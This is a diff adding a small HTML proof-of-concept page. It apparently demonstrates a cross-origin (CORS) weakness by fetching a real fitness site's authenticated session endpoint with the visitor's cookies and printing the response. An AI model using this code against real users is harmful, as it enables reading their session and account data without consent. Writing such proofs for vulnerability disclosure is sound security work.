@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>CORS Proof of Concept</h3>
+<pre id="result">Loading...</pre>
+
+<script>
+fetch("https://www.myfitnesspal.com/api/auth/session", {
+  method: "GET",
+  credentials: "include" 
+})
+.then(response => response.text())
+.then(data => {
+  document.getElementById("result").innerText = data;
+})
+.catch(error => {
+  document.getElementById("result").innerText = error;
+});
+</script>
+
+</body>
+</html>
